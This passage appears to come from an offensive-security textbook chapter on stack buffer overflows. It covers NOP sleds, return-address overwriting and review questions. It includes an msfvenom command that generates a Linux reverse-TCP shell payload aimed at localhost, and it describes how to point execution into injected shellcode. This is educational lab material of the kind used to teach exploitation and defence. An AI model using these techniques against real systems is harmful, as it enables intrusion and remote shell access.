<p>Now that we <a id="_idIndexMarker791"/>know what characters break our shellcode, we <a id="_idIndexMarker792"/>can issue our <strong class="source-inline">msfvenom</strong> command to grab a payload, as follows:</p>
<p class="source-code"># msfvenom --payload linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=45678 --format py --bad-chars '\x00\x09\x0a\x20\xff' </p>
<p>What you do with the output is up to you. You could dump it into a Python script that you’d call as an argument when you run the vulnerable program. In the following example, we’ve dumped it straight into a single command for ease:</p>
<div>
<div class="IMG---Figure" id="_idContainer224">
<img alt="Figure 10.11 – Using Python to stuff the buffer with shellcode " height="531" src="image/Figure_10.11_B17616.jpg" width="1217"/>
</div>
</div>
<p class="figure-caption">Figure 10.11 – Using Python to stuff the buffer with shellcode</p>
<p>Here we see a <em class="italic">proof of concept</em> – all of that gunk is sanitized payload with the return memory overwrite concatenated at the end. This proves that the code didn’t break because you can see the segmentation fault <strong class="source-inline">Cannot access memory</strong> at the defined location. If the code actually works and we point the memory address at a location that takes the flow to the top of the shellcode, then we’re golden. There’s just one trick left, however, and that’s pointing at the exact point in memory where the shellcode lies, which is about as tough as it sounds. Did you notice the padding at the front of the shellcode? It is 150 bytes of <strong class="source-inline">\x90</strong>; unlike the letter <em class="italic">z</em>, that is not arbitrary.</p>
<h2 id="_idParaDest-202"><a id="_idTextAnchor201"/>Grab your mittens, we’re going NOP sledding</h2>
<p>The processor doesn’t have to work all the time. After all, we all need a break now and then. The processor <a id="_idIndexMarker793"/>will always do as it is told, and it just so happens that we can tell it to <em class="italic">not</em> do anything. If we tell <a id="_idIndexMarker794"/>our processor to conduct no operations, this instruction is called a <strong class="bold">NOP</strong>. To get an idea of how this helps us, let’s take a look at the following stack structure:</p>
<div>
<div class="IMG---Figure" id="_idContainer225">
<img alt="Figure 10.12 – How the attacker directs execution " height="409" src="image/Figure_10.12_B17616.jpg" width="420"/>
</div>
</div>
<p class="figure-caption">Figure 10.12 – How the attacker directs execution</p>
<p>The entire red box is what we’re stuffing into the buffer. As you can see, it just won’t fit; it will <em class="italic">overflow</em> the buffer box into the space below, including the return address, which we will point to the middle of the NOP sled. The flow of execution will reach the return address and jump to there, thinking it’s returning as it’s supposed to; what it doesn’t realize is that we overwrote that address, and it will now faithfully jump to the NOP sled we just stuffed into the buffer. The NOP sled is nothing more than a long string of <em class="italic">no-operation</em> codes. If execution lands there, the processor will just blow through them doing nothing before moving on to the next instruction. Execution lands at the top of a hill and almost literally slides down the hill. At the bottom of the hill is our shellcode. This method means we don’t need to be accurate with our prediction of a return address – it simply has to land anywhere in the NOPs.</p>
<p>The NOP code <strong class="source-inline">\x90</strong> is the most popular, but as with many things in defense, the roads most traveled are the ones most easily blocked. However, you are able to pass a NOP flag to <strong class="source-inline">msfvenom</strong> and it will generate a sled made up of a variety of NOP codes for you. Regardless of the method you use, you need to know the length of the NOP sled. If it’s too long, you’ll just <a id="_idIndexMarker795"/>end up overwriting RET with a portion of shellcode, which is <a id="_idIndexMarker796"/>probably a segmentation fault. We already know that our buffer is 300 bytes, and our payload is 150 bytes. In theory, stuffing exactly half of the buffer with NOPs should allow us to overwrite the return address precisely. So, where do we point the return? Well, anywhere really, as long as you aim for the NOP sled. Any address in that range will work.</p>
<p>Let’s again use the hexadecimal examination command in GDB to observe the stack after you stuff the NOP sled: </p>
<div>
<div class="IMG---Figure" id="_idContainer226">
<img alt="Figure 10.13 – NOP sled directing us to shellcode " height="723" src="image/Figure_10.13_B17616.jpg" width="1380"/>
</div>
</div>
<p class="figure-caption">Figure 10.13 – NOP sled directing us to shellcode</p>
<p>Here, we’ve highlighted our sledding hill. Now we know that any target between <strong class="source-inline">0xbffff344</strong> and <strong class="source-inline">0xbffff3d7</strong> will land us in our NOP sled, and we’ll slide right into shellcode execution.</p>
<p>Now we can use what we’ve learned to be flexible with different executables in different environments. Try these steps again with a different C program that also contains a vulnerable buffer, so that you’ll be working with different values.</p>
<h1 id="_idParaDest-203"><a id="_idTextAnchor202"/>Summary</h1>
<p>In this chapter, we learned the basics of low-level memory management during the execution of a program. We learned how to examine the finer points of what’s happening during execution, including how to temporarily pause execution so we can examine memory in detail. We covered some basic introductory knowledge on assembly language and debugging to not only complete the study in this chapter but to prepare for the work ahead in later chapters. We wrote up a quick and vulnerable C program to demonstrate stack overflow attacks. Once we understood the program at the stack level, we generated a payload in pure hexadecimal opcodes with <strong class="source-inline">msfvenom</strong>. To prepare this payload for the target, we learned how to manually search for and remove code-breaking shellcode.</p>
<p>Coming up in the next chapter, we’re going to look at how these principles have caused defenders to evolve, and the innovative solution of return-oriented programming.</p>
<h1 id="_idParaDest-204"><a id="_idTextAnchor203"/>Questions</h1>
<p>Answer the following questions to test your knowledge of this chapter:</p>
<ol>
<li>The stack is a ______, or LIFO, structure.</li>
<li>For this list of generic registers, identify which one of the eight is not listed – <strong class="source-inline">EAX</strong>, <strong class="source-inline">EBX</strong>, <strong class="source-inline">ECX</strong>, <strong class="source-inline">EDX</strong>, <strong class="source-inline">EBP</strong>, <strong class="source-inline">ESI</strong>, <strong class="source-inline">EDI</strong>.</li>
<li>In AT&amp;T assembly language notation, the operand order when copying data from one place to another is _________.</li>
<li><strong class="source-inline">jnz</strong> causes execution to jump to the specified address if the value of <strong class="source-inline">EBX</strong> is equal to zero. (True | False)</li>
<li>The memory space between the base pointer and the stack pointer is the ________.</li>
<li>The <strong class="source-inline">\x90</strong> opcode notoriously breaks shellcode. (True | False)</li>
<li>What does little-endian mean?</li>
</ol>
<h1 id="_idParaDest-205"><a id="_idTextAnchor204"/>Further reading</h1>
<p>For more information regarding the topics that were covered in this chapter, take a look at the following resources:</p>
<ul>
<li><em class="italic">Smashing the stack for fun and profit</em>, a notorious discussion of stack overflow attacks (<a href="http://www.phrack.org/issues/49/14.xhtml#article">http://www.phrack.org/issues/49/14.xhtml#article</a>)</li>
<li><em class="italic">Practical Reverse Engineering: x86, x64, ARM, Windows Kernel, Reversing Tools, and Obfuscation</em>, Dang, Bruce, Alexandre Gazet, and Elias Bachaalany by John Wiley and Sons, 2014.</li>
</ul>
</div>
</div></body></html>